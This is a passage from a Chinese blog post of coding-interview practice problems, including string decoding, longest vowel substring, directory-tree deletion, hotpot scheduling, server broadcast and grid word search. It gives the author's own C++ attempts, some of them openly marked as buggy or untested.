class="line">        else if(c==&#x27;[&#x27;)</span><br><span class="line">        &#123;</span><br><span class="line">            cout&lt;&lt;&quot;遇到了[ : &quot;&lt;&lt;endl;</span><br><span class="line">            cout&lt;&lt;&quot;递归调用solution(s,i)&quot;&lt;&lt;&quot; 此时i为 &quot;&lt;&lt;i&lt;&lt;endl;</span><br><span class="line">            string decode=solution(s,i);</span><br><span class="line">            cout&lt;&lt;&quot;调用后的 decode 为:&quot;&lt;&lt;decode&lt;&lt;endl;</span><br><span class="line"></span><br><span class="line">              cout&lt;&lt;&quot;经过count &quot;&lt;&lt;count&lt;&lt;&quot;和result &quot;&lt;&lt;result;</span><br><span class="line">            for(int j=0;j&lt;count;j++)</span><br><span class="line">            &#123;</span><br><span class="line">                result+=decode;</span><br><span class="line">            &#125;</span><br><span class="line">            cout&lt;&lt;&quot;处理后的result为 &quot;&lt;&lt;result&lt;&lt;endl;</span><br><span class="line">            count=0;</span><br><span class="line">            cout&lt;&lt;&quot;count归零&quot;&lt;&lt;endl;</span><br><span class="line">        &#125;</span><br><span class="line">        else if(c==&#x27;]&#x27;)</span><br><span class="line">        &#123;</span><br><span class="line">            cout&lt;&lt;&quot;遇到了] :&quot;&lt;&lt;endl;</span><br><span class="line">            cout&lt;&lt;&quot;return result &quot;&lt;&lt;result&lt;&lt;endl;</span><br><span class="line">            return result;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;&quot;循环完毕，return result &quot;&lt;&lt;result&lt;&lt;endl;</span><br><span class="line">    return result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<blockquote>
<p>3[k2[mn]]<br>第1个字符<br>遇到了字符:3变成数字 3<br>第2个字符<br>遇到了[ :<br>递归调用solution(s,i) 此时i为 2<br>第3个字符<br>遇到了字符:k加和字母 k<br>第4个字符<br>遇到了字符:2变成数字 2<br>第5个字符<br>遇到了[ :<br>递归调用solution(s,i) 此时i为 5<br>第6个字符<br>遇到了字符:m加和字母 m<br>第7个字符<br>遇到了字符:n加和字母 mn<br>第8个字符<br>遇到了] :<br>return result mn<br>调用后的 decode 为:mn<br>经过count 2和result k处理后的result为 kmnmn<br>count归零<br>第9个字符<br>遇到了] :<br>return result kmnmn<br>调用后的 decode 为:kmnmn<br>经过count 3和result 处理后的result为 kmnmnkmnmnkmnmn<br>count归零<br>循环完毕，return result kmnmnkmnmnkmnmn<br>kmnmnkmnmnkmnmn</p>
</blockquote>
<blockquote>
<p>3[k]2[mn]<br>第1个字符<br>遇到了字符:3变成数字 3<br>第2个字符<br>遇到了[ :<br>递归调用solution(s,i) 此时i为 2<br>第3个字符<br>遇到了字符:k加和字母 k<br>第4个字符<br>遇到了] :<br>return result k<br>调用后的 decode 为:k<br>经过count 3和result 处理后的result为 kkk<br>count归零<br>第5个字符<br>遇到了字符:2变成数字 2<br>第6个字符<br>遇到了[ :<br>递归调用solution(s,i) 此时i为 6<br>第7个字符<br>遇到了字符:m加和字母 m<br>第8个字符<br>遇到了字符:n加和字母 mn<br>第9个字符<br>遇到了] :<br>return result mn<br>调用后的 decode 为:mn<br>经过count 2和result kkk处理后的result为 kkkmnmn<br>count归零<br>循环完毕，return result kkkmnmn<br>kkkmnmn</p>
</blockquote>
<p>注意的点：</p>
<blockquote>
<p>1.参数为int &amp;n，实参不能直接给数字，需要通过一个变量声明</p>
<p>2.const int &amp;n，虽然可以解决上述问题，但是，如果只能对n只读访问了，不可修改</p>
</blockquote>
<h1 id="40-最长的元音字符串"><a href="#40-最长的元音字符串" class="headerlink" title="40.最长的元音字符串"></a>40.最长的元音字符串</h1><h2 id="题目描述-20"><a href="#题目描述-20" class="headerlink" title="题目描述"></a>题目描述</h2><p>定义当一个字符串只有元音字母<code>(a,e,i,o,u,A,E,I,O,U)</code>组成,<br>称为元音字符串，现给定一个字符串，请找出其中最长的元音字符串，<br>并返回其长度，如果找不到请返回<code>0</code>，<br>字符串中任意一个连续字符组成的子序列称为该字符串的子串</p>
<h2 id="输入描述-29"><a href="#输入描述-29" class="headerlink" title="输入描述"></a>输入描述</h2><p>一个字符串其长度 <code>0 &lt; length</code> ,字符串仅由字符<code>a-z</code>或<code>A-Z</code>组成</p>
<h2 id="输出描述-29"><a href="#输出描述-29" class="headerlink" title="输出描述"></a>输出描述</h2><p>一个整数，表示最长的元音字符子串的长度</p>
<h2 id="示例一-15"><a href="#示例一-15" class="headerlink" title="示例一"></a>示例一</h2><h3 id="输入-24"><a href="#输入-24" class="headerlink" title="输入"></a>输入</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">asdbuiodevauufgh</span><br></pre></td></tr></table></figure>

<h3 id="输出-23"><a href="#输出-23" class="headerlink" title="输出"></a>输出</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">3</span><br></pre></td></tr></table></figure>

<h2 id="个人代码-19"><a href="#个人代码-19" class="headerlink" title="个人代码"></a>个人代码</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line"> vector&lt;char&gt; yuanyin=&#123;&#x27;a&#x27;,&#x27;e&#x27;,&#x27;i&#x27;,&#x27;o&#x27;,&#x27;u&#x27;,&#x27;A&#x27;,&#x27;E&#x27;,&#x27;I&#x27;,&#x27;O&#x27;,&#x27;U&#x27;&#125;;</span><br><span class="line"> string s;</span><br><span class="line"> cin&gt;&gt;s;</span><br><span class="line"></span><br><span class="line">int len=0,co=0,flag=-1;</span><br><span class="line"> for(int i=0;i&lt;s.size();i++)</span><br><span class="line"> &#123;</span><br><span class="line"></span><br><span class="line">    char cur=s[i];</span><br><span class="line">    for(auto a:yuanyin)</span><br><span class="line">    &#123;</span><br><span class="line">        if(cur==a)</span><br><span class="line">        &#123;</span><br><span class="line">           flag=1;</span><br><span class="line">           break;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    if(flag&gt;0)</span><br><span class="line">    &#123;</span><br><span class="line">        co++;</span><br><span class="line">        len=max(len,co);</span><br><span class="line">        flag=-9;</span><br><span class="line">    &#125;</span><br><span class="line">    else co=0;</span><br><span class="line"> &#125;</span><br><span class="line"> cout&lt;&lt;len;</span><br><span class="line"></span><br><span class="line"> return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="41-删除目录"><a href="#41-删除目录" class="headerlink" title="41.*删除目录"></a>41.*删除目录</h1><h2 id="题目描述-21"><a href="#题目描述-21" class="headerlink" title="题目描述"></a>题目描述</h2><p>某文件系统中有N个目录，<br>每个目录都一个独一无二的ID。<br>每个目录只有一个父目录，<br>但每个目录下可以有零个或多个子目录，<br>目录结构呈树状结构。<br>假设 根目录的ID为<code>0</code>，且根目录没有父目录<br>ID用唯一的正整数表示，并统一编号<br>现给定目录ID和其付目录ID的对应父子关系表<br><code>[子目录ID,父目录ID]</code>，以及一个待删除的目录ID，<br>请计算并返回一个ID序列，<br>表示因为删除指定目录后剩下的所有目录，<br>返回的ID序列以递增序输出<br>注意：<br>1、被删除的目录或文件编号一定在输入的ID序列中；<br>2、当一个目录删除时，它所有的子目录都会被删除。</p>
<h2 id="输入描述-30"><a href="#输入描述-30" class="headerlink" title="输入描述"></a>输入描述</h2><p>输入的第一行为父子关系表的长度<code>m</code>；接下来的<code>m</code>行为<code>m</code>个父子关系对；<br>最后一行为待删除的ID。<br>序列中的元素以空格分割，<br>参见样例。</p>
<h2 id="输出描述-30"><a href="#输出描述-30" class="headerlink" title="输出描述"></a>输出描述</h2><p>输出一个序列，表示因为删除指定目录后，剩余的目录ID。</p>
<h2 id="示例一-16"><a href="#示例一-16" class="headerlink" title="示例一"></a>示例一</h2><h3 id="输入-25"><a href="#输入-25" class="headerlink" title="输入"></a>输入</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">5</span><br><span class="line">8 6</span><br><span class="line">10 8</span><br><span class="line">6 0</span><br><span class="line">20 8</span><br><span class="line">2 6</span><br><span class="line">8</span><br></pre></td></tr></table></figure>

<h3 id="输出-24"><a href="#输出-24" class="headerlink" title="输出"></a>输出</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2 6</span><br></pre></td></tr></table></figure>

<h2 id="个人代码-20"><a href="#个人代码-20" class="headerlink" title="个人代码"></a>个人代码</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set&lt;int&gt; list;</span><br><span class="line">void zimulu(int a,map&lt;int,int&gt; s)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    for(auto sm:s) </span><br><span class="line">    &#123;</span><br><span class="line">        //</span><br><span class="line">        //</span><br><span class="line">        if(sm.second!=a&amp;&amp;sm.second!=0&amp;&amp;sm.first==a) list.insert(sm.second);</span><br><span class="line">        if(sm.second!=a&amp;&amp;sm.first!=a) list.insert(sm.first);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">&#125;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    //[子，父]</span><br><span class="line">    int n;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    map&lt;int,int&gt; mp;</span><br><span class="line">    for(int i=0;i&lt;n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        int a,b;</span><br><span class="line">        cin&gt;&gt;a&gt;&gt;b;</span><br><span class="line">        mp[a]=b;</span><br><span class="line">    &#125;</span><br><span class="line">    int m;//待删除目录ID</span><br><span class="line">    cin&gt;&gt;m;</span><br><span class="line">    zimulu(m,mp);</span><br><span class="line"></span><br><span class="line">    for(auto w:list)</span><br><span class="line">    &#123;</span><br><span class="line">         cout&lt;&lt;w&lt;&lt;&quot; &quot;;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">   </span><br><span class="line">    //cout&lt;&lt;w.first&lt;&lt;&quot;,&quot;&lt;&lt;w.second&lt;&lt;endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="42-吃火锅"><a href="#42-吃火锅" class="headerlink" title="42.吃火锅"></a>42.吃火锅</h1><h2 id="题目描述-22"><a href="#题目描述-22" class="headerlink" title="题目描述"></a>题目描述</h2><p>入职后，导师会请你吃饭，你选择了火锅，<br>火锅里会在不同时间下很多菜，<br>不同食材要煮不同时间，才能变得刚好合适，<br>你希望吃到最多的刚好合适的菜，<br>但是你的手速不够快用<code>m</code>代替手速，<br>每次下手捞菜后至少要过<code>m</code>秒，<br>才能再捞（每次只能捞一个）那么用最合理的策略，<br>最多能吃到多少，刚好合适的菜</p>
<h2 id="输入描述-31"><a href="#输入描述-31" class="headerlink" title="输入描述"></a>输入描述</h2><p>第一行两个整数<code>n</code>，<code>m</code><br>其中<code>n</code>代表往锅里下菜的个数<br><code>m</code>代表手速<br>接下来有<code>n</code>行，<br>每行有两个数<code>x</code>，<code>y</code><br>代表第<code>x</code>秒下的菜过<code>y</code>秒才能变得刚好合适（<code>1 &lt; mn &lt; 1000</code>），（<code>1 &lt; xy &lt; 1000</code>）</p>
<h2 id="输出描述-31"><a href="#输出描述-31" class="headerlink" title="输出描述"></a>输出描述</h2><p>输出一个整数代表用最合理的策略，最多能吃到刚好合适的菜的数量</p>
<h2 id="示例一-17"><a href="#示例一-17" class="headerlink" title="示例一"></a>示例一</h2><h3 id="输入-26"><a href="#输入-26" class="headerlink" title="输入"></a>输入</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2 1</span><br><span class="line">1 2</span><br><span class="line">2 1</span><br></pre></td></tr></table></figure>

<h3 id="输出-25"><a href="#输出-25" class="headerlink" title="输出"></a>输出</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1</span><br></pre></td></tr></table></figure>

<h2 id="个人代码（待测试）"><a href="#个人代码（待测试）" class="headerlink" title="个人代码（待测试）"></a>个人代码（待测试）</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    int n,m;//菜的个数，手速</span><br><span class="line">    cin&gt;&gt;n&gt;&gt;m;</span><br><span class="line">    vector&lt;pair&lt;int,int&gt; &gt;a(n);</span><br><span class="line">    for(int i=0;i&lt;n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        int b,c;</span><br><span class="line">        cin&gt;&gt;b&gt;&gt;c;</span><br><span class="line">        a[i]=make_pair(b,c);//第bs的菜要cs才能吃</span><br><span class="line">    &#125;</span><br><span class="line">    //那就是看间隔咯？ b+c与之前的相减,&gt;=m那就是可以咯</span><br><span class="line">    int pre=a[0].first+a[0].second;</span><br><span class="line">    </span><br><span class="line">    int co=0;</span><br><span class="line">      for(auto list:a)</span><br><span class="line">    &#123;</span><br><span class="line">        int cur=list.second+list.first;</span><br><span class="line">        if(cur-pre&gt;=m) co++;</span><br><span class="line">        pre=cur;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    cout&lt;&lt;co+1;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="65-服务器广播"><a href="#65-服务器广播" class="headerlink" title="65.服务器广播"></a>65.服务器广播</h1><h2 id="题目描述-23"><a href="#题目描述-23" class="headerlink" title="题目描述"></a>题目描述</h2><p>服务器连接方式包括直接相连，间接连接。<br><code>A</code>和<code>B</code>直接连接，<code>B</code>和<code>C</code>直接连接，则<code>A</code>和<code>C</code>间接连接。<br>直接连接和间接连接都可以发送广播。<br>给出一个<code>N*N</code>数组，代表<code>N</code>个服务器，<code>matrix[i][j] == 1</code>，<br>则代表<code>i</code>和<code>j</code>直接连接；不等于1时，代表<code>i</code>和<code>j</code>不直接连接。<br><code>matrix[i][i] == 1</code>，<br>即自己和自己直接连接。<code>matrix[i][j] == matrix[j][i]</code>。<br>计算初始需要给几台服务器广播，<br>才可以使每个服务器都收到广播。</p>
<h2 id="输入描述-32"><a href="#输入描述-32" class="headerlink" title="输入描述"></a>输入描述</h2><p>输入为<code>N</code>行，每行有<code>N</code>个数字，为<code>0</code>或<code>1</code>，由空格分隔，<br>构成<code>N*N</code>的数组，<code>N</code>的范围为 <code>1 &lt;= N &lt;= 40</code></p>
<h2 id="输出描述-32"><a href="#输出描述-32" class="headerlink" title="输出描述"></a>输出描述</h2><p>输出一个数字，为需要广播的服务器的数量</p>
<h2 id="示例一-18"><a href="#示例一-18" class="headerlink" title="示例一"></a>示例一</h2><h3 id="输入-27"><a href="#输入-27" class="headerlink" title="输入"></a>输入</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1 0 0</span><br><span class="line">0 1 0</span><br><span class="line">0 0 1</span><br></pre></td></tr></table></figure>

<p>Copy</p>
<h3 id="输出-26"><a href="#输出-26" class="headerlink" title="输出"></a>输出</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">3</span><br></pre></td></tr></table></figure>

<h2 id="代码-有误"><a href="#代码-有误" class="headerlink" title="代码(有误)"></a>代码(有误)</h2><p>本质是映射map&lt;int,vector&lt;int&gt;&gt; 0,1,2</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include&lt;iostream&gt;</span><br><span class="line">#include&lt;vector&gt;</span><br><span class="line">#include&lt;map&gt;</span><br><span class="line">#include&lt;sstream&gt;</span><br><span class="line">#include&lt;algorithm&gt;</span><br><span class="line">using namespace std;</span><br><span class="line">void solution(int **a,int n)</span><br><span class="line">&#123;</span><br><span class="line">   /*</span><br><span class="line">   0 1</span><br><span class="line">   1 0</span><br><span class="line">   */</span><br><span class="line">  map&lt;int,vector&lt;int&gt; &gt;mp;</span><br><span class="line">  int mpkey=0;</span><br><span class="line">    for(int i=0;i&lt;n;i++)</span><br><span class="line">   &#123;</span><br><span class="line">    cout&lt;&lt;&quot;now &quot;&lt;&lt;i&lt;&lt;endl;</span><br><span class="line">    bool isexist=false;</span><br><span class="line">    for(auto &amp;item:mp)//加个&amp;，表示可修改</span><br><span class="line">    for(int &amp;it:item.second)</span><br><span class="line">    &#123;</span><br><span class="line">        if(it==i)</span><br><span class="line">        &#123;</span><br><span class="line">            cout&lt;&lt;it&lt;&lt;endl;</span><br><span class="line">            isexist=true;</span><br><span class="line">            mpkey=item.first;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    if(!isexist)//不包含，新开一项</span><br><span class="line">    &#123;</span><br><span class="line">      //  vector&lt;int&gt; list;</span><br><span class="line">        mp[i]= vector&lt;int&gt;();</span><br><span class="line">        mpkey=i;</span><br><span class="line">        cout&lt;&lt;&quot;now key&quot;&lt;&lt;mpkey&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">    for(int k=i;k&lt;n;k++)</span><br><span class="line">    &#123;</span><br><span class="line">       // vector&lt;int&gt; tem;</span><br><span class="line">        if(i!=k &amp;&amp; a[i][k]==1)</span><br><span class="line">        &#123;</span><br><span class="line">             mp[mpkey].push_back(k);</span><br><span class="line">           // tem.push_back(k);</span><br><span class="line">        &#125;</span><br><span class="line">   </span><br><span class="line">    &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   cout&lt;&lt;mp.size();</span><br><span class="line">&#125;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    string s,t;</span><br><span class="line">    vector&lt;int&gt; a;</span><br><span class="line">    getline(cin,s);</span><br><span class="line">    cout&lt;&lt;s.size()&lt;&lt;endl;</span><br><span class="line">    for(int i=0;i&lt;s.size();i++)</span><br><span class="line">    &#123;</span><br><span class="line">        if(s[i]!=&#x27; &#x27;) a.push_back(s[i]-&#x27;0&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">    int n=a.size();//n维</span><br><span class="line">    cout&lt;&lt;a.size()&lt;&lt;endl;</span><br><span class="line"></span><br><span class="line">    //int an[n][n];</span><br><span class="line">    int **an=new int*[n];</span><br><span class="line"></span><br><span class="line">    for(int i=0;i&lt;n;i++)// 第一行</span><br><span class="line">        an[0][i]=a[i];</span><br><span class="line">    for(int i=1;i&lt;n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        string t;</span><br><span class="line">        getline(cin,s);</span><br><span class="line">        stringstream ss(s);</span><br><span class="line">        int co=0;</span><br><span class="line">        while(getline(ss,t,&#x27; &#x27;))</span><br><span class="line">        &#123;</span><br><span class="line">            an[i][co]=t[0]-&#x27;0&#x27;;</span><br><span class="line">            co++;</span><br><span class="line">            if(co==n) break;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    solution(an,n);</span><br><span class="line">    // for(int i=0;i&lt;n;i++)</span><br><span class="line">    // &#123;</span><br><span class="line">    //     for(int j=0;j&lt;n;j++)</span><br><span class="line">    //     cout&lt;&lt;an[i][j]&lt;&lt;&quot;,&quot;;</span><br><span class="line"></span><br><span class="line">    //     cout&lt;&lt;endl;</span><br><span class="line">    // &#125;</span><br><span class="line">   </span><br><span class="line">    /*</span><br><span class="line">    a[i][j]即a[j][i]为1表示直接相连 a[i][i]自己相连</span><br><span class="line">    </span><br><span class="line">    既然是广播，那就是第一行与每一列</span><br><span class="line">    */</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h1 id="66-二叉树广度优先遍历"><a href="#66-二叉树广度优先遍历" class="headerlink" title="66.二叉树广度优先遍历"></a>66.二叉树广度优先遍历</h1><p>即层序遍历。</p>
<p>从上到下，从左到右依次打印出来，就是ABCDEFG。</p>
<p>实现思路，用队列实现。A入队，从根结点开始。接着A的两个孩子不空，BC入队（A出队，队头指向B）；然后B的两个孩子DE入队，B出队，队头指向C；C的两个孩子FG进入，C出队；最后将DEFG输出。</p>
<p>深度优先遍历就是，前中后序遍历</p>
<h1 id="67-找单词"><a href="#67-找单词" class="headerlink" title="67.找单词"></a>67.找单词</h1><h2 id="题目描述-24"><a href="#题目描述-24" class="headerlink" title="题目描述"></a>题目描述</h2><p>给一个字符串和一个二维字符数组，如果该字符串存在于该数组中，则按字符串的字符顺序输出字符串每个字符所在单元格的位置下标字符串，如果找不到返回字符串<code>N</code>。</p>
<ol>
<li>需要按照字符串的字符组成顺序搜索，且搜索到的位置必须是相邻单元格，其中“相邻单元格”是指那些水平相邻或垂直相邻的单元格。</li>
<li>同一个单元格内的字母不允许被重复使用。</li>
<li>假定在数组中最多只存在一个可能的匹配。</li>
</ol>
<h2 id="输入描述-33"><a href="#输入描述-33" class="headerlink" title="输入描述"></a>输入描述</h2><ol>
<li>第1行为一个数字<code>N</code>指示二维数组在后续输入所占的行数。</li>
<li>第2行到第<code>N+1</code>行输入为一个二维大写字符数组，每行字符用半角,分割。</li>
<li>第<code>N+2</code>行为待查找的字符串，由大写字符组成。</li>
<li>二维数组的大小为<code>N*N</code>，<code>0 &lt; N &lt;= 100</code>。</li>
<li>单词长度<code>K</code>，<code>0 &lt; K &lt; 1000</code>。</li>
</ol>
<h2 id="输出描述-33"><a href="#输出描述-33" class="headerlink" title="输出描述"></a>输出描述</h2><p>输出一个位置下标字符串，拼接格式为：第1个字符行下标+”,”+第1个字符列下标+”,”+第2个字符行下标+”,”+第2个字符列下标…+”,”+第N个字符行下标+”,”+第N个字符列下标示例1</p>
<h2 id="示例一-19"><a href="#示例一-19" class="headerlink" title="示例一"></a>示例一</h2><h3 id="输入-28"><a href="#输入-28" class="headerlink" title="输入"></a>输入</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">4</span><br><span class="line">A,C,C,F</span><br><span class="line">C,D,E,D</span><br><span class="line">B,E,S,S</span><br><span class="line">F,E,C,A</span><br><span class="line">ACCESS</span><br></pre></td></tr></table></figure>

<h3 id="输出-27"><a href="#输出-27" class="headerlink" title="输出"></a>输出</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0,0,0,1,0,2,1,2,2,2,2,3</span><br></pre></td></tr></table></figure>

<h2 id="代码1（不符题意）"><a href="#代码1（不符题意）" class="headerlink" title="代码1（不符题意）"></a>代码1（不符题意）</h2><p>哦，这个顺序搜索有说法的</p>
<p>**A,C,C,**F<br>        C,D,**E,**D<br>        B,E,<strong>S</strong>,<strong>S</strong><br>        F,E,C,A<br>ACCESS</p>
<p>反正最终路径有横有折，一点点斜的都不要</p>
<p>这玩意儿想到了什么，走迷宫哇。只能横向，竖向</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    int n;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    cin.ignore();</span><br><span class="line">    string s,t;</span><br><span class="line">    vector&lt;vector&lt;string&gt; &gt;a(n,vector&lt;string&gt;(n,&quot;&quot;));</span><br><span class="line">    for(int i=0;i&lt;n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">         cin&gt;&gt;s;</span><br><span class="line">         stringstream ss(s);</span><br><span class="line">         int j=0;</span><br><span class="line">      //   vector&lt;string&gt; aa;</span><br><span class="line">         while(getline(ss,t,&#x27;,&#x27;))</span><br><span class="line">         &#123;</span><br><span class="line">            //aa.push_back(t);</span><br><span class="line">            if(j==n) break;//退出循环</span><br><span class="line">            a[i][j]=t;</span><br><span class="line">           // cout&lt;&lt;j&lt;&lt;endl;</span><br><span class="line">            j++;</span><br><span class="line">          </span><br><span class="line">         &#125;</span><br><span class="line">      //  a.push_back(aa);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // for(int i=0;i&lt;n;i++)</span><br><span class="line">    // &#123;</span><br><span class="line">    //     for(int j=0;j&lt;n;j++)</span><br><span class="line">    // &#123;</span><br><span class="line">    //     cout&lt;&lt;a[i][j];</span><br><span class="line">    // &#125;</span><br><span class="line">    // cout&lt;&lt;endl;</span><br><span class="line">    // &#125;</span><br><span class="line">  </span><br><span class="line">    string tt;</span><br><span class="line">    cin&gt;&gt;tt;</span><br><span class="line"></span><br><span class="line">    int x=0,y=0,i=0,len=tt.size();</span><br><span class="line">    string tem=&quot;&quot;,result=&quot;&quot;;</span><br><span class="line">    while(i&lt;len)</span><br><span class="line">    &#123;</span><br><span class="line">        tem=tt[i];</span><br><span class="line">     //   cout&lt;&lt;a[x][y]&lt;&lt;endl;</span><br><span class="line">        if(a[x][y]==tem)</span><br><span class="line">        &#123;</span><br><span class="line">            i++;</span><br><span class="line">            // cout&lt;&lt;x&lt;&lt;&quot;,&quot;&lt;&lt;y;</span><br><span class="line">            // if(i!=len-1) cout&lt;&lt;&quot;,&quot;;</span><br><span class="line">            result+=to_string(x)+&quot;,&quot;+to_string(y)+&quot;,&quot;;</span><br><span class="line">            tem=&quot;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">         y++;//列坐标移动</span><br><span class="line">         if(y==n)</span><br><span class="line">         &#123;</span><br><span class="line">            y=0;</span><br><span class="line">            x++;</span><br><span class="line">         &#125;</span><br><span class="line">       //  if(x==n) break;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">    // cout&lt;&lt;a[0][1];</span><br><span class="line">    cout&lt;&lt;result.substr(0,result.size()-1);</span><br><span class="line"></span><br><span class="line">   </span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vector&lt;int&gt; res;</span><br><span class="line">int check(vector&lt;vector&lt;string&gt; &gt; a,int r,int c,string s,int i)</span><br><span class="line">&#123;</span><br><span class="line">       // int j=a.size();</span><br><span class="line">    string next=&quot;&quot;;</span><br><span class="line">          next=s[i];</span><br><span class="line">        if(r+1&lt;a.size()&amp;&amp;c+1&lt;a.size())</span><br><span class="line">      &#123;</span><br><span class="line">         if(a[r+1][c]==next) return 1;</span><br><span class="line">         else if(a[r][c+1]==next) return 2;</span><br><span class="line">      &#125;</span><br><span class="line">      return 0;</span><br><span class="line">&#125;</span><br><span class="line">void search(vector&lt;vector&lt;string&gt; &gt; a,string s,int row,int col,int i)</span><br><span class="line">&#123;</span><br><span class="line">        if(i&gt;s.size()) </span><br><span class="line">        &#123;</span><br><span class="line">            return;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">      string cur=&quot;&quot;;</span><br><span class="line">      cur+=s[i];</span><br><span class="line"></span><br><span class="line">      if(i==0)</span><br><span class="line">      &#123;</span><br><span class="line">         for(int i=0;i&lt;a.size();i++)</span><br><span class="line">         for(int j=0;j&lt;a.size();j++)</span><br><span class="line">         &#123;</span><br><span class="line">            if(a[i][j]==cur)</span><br><span class="line">            &#123;</span><br><span class="line">               row=i;</span><br><span class="line">               col=j;</span><br><span class="line">               cout&lt;&lt;row&lt;&lt;&quot;,&quot;&lt;&lt;col&lt;&lt;endl;</span><br><span class="line">               break;</span><br><span class="line">            &#125;</span><br><span class="line">         &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      </span><br><span class="line">      res.push_back(row);</span><br><span class="line">      res.push_back(col);</span><br><span class="line"></span><br><span class="line">          if(check(a,row,col,s,i+1)==1)//往下走</span><br><span class="line">      &#123;</span><br><span class="line">         search(a,s,row+1,col,i+1);</span><br><span class="line">      &#125;  </span><br><span class="line">      else if(check(a,row,col,s,i+1)==2)//往右走</span><br><span class="line">      &#123;</span><br><span class="line">         search(a,s,row,col+1,i+1);</span><br><span class="line">      &#125;</span><br><span class="line">   </span><br><span class="line">     </span><br><span class="line">   </span><br><span class="line">      //N情况没有考虑</span><br><span class="line">      //有多个首值，第一个首值不一定成功，没有考虑</span><br><span class="line">      //行和列值相同时，先取哪一个没有考虑</span><br><span class="line">&#125;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    int n;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    cin.ignore();</span><br><span class="line">    string s,t;</span><br><span class="line">    vector&lt;vector&lt;string&gt; &gt;a(n,vector&lt;string&gt;(n,&quot;&quot;));</span><br><span class="line">   //vector&lt;string&gt; a(n);</span><br><span class="line">    for(int i=0;i&lt;n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">         cin&gt;&gt;s;</span><br><span class="line">         stringstream ss(s);</span><br><span class="line">         int j=0;</span><br><span class="line">        // string tt=&quot;&quot;;</span><br><span class="line"></span><br><span class="line">         while(getline(ss,t,&#x27;,&#x27;))</span><br><span class="line">         &#123;</span><br><span class="line">            a[i][j]=t;</span><br><span class="line">            j++;</span><br><span class="line">            if(j&gt;n) break;</span><br><span class="line">          // tt+=t;</span><br><span class="line">         &#125;</span><br><span class="line">      //  a.push_back(tt);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">   // if(a[0][0]==&#x27;A&#x27;) cout&lt;&lt;&quot;erer&quot;&lt;&lt;endl;</span><br><span class="line">    if(a[0][0]==&quot;A&quot;) cout&lt;&lt;&quot;~~~&quot;&lt;&lt;endl;</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">    string tt;</span><br><span class="line">    cin&gt;&gt;tt;</span><br><span class="line"></span><br><span class="line">    int x=0,y=0,i=0,len=tt.size();</span><br><span class="line">    string tem=&quot;&quot;,result=&quot;&quot;;</span><br><span class="line">    </span><br><span class="line">    search(a,tt,0,0,0);</span><br><span class="line">   // cout&lt;&lt;a[0][1];</span><br><span class="line">    for(int li:res)</span><br><span class="line">    cout&lt;&lt;li&lt;&lt;&quot;,&quot;;</span><br><span class="line"></span><br><span class="line">   </span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>二维数组</p>
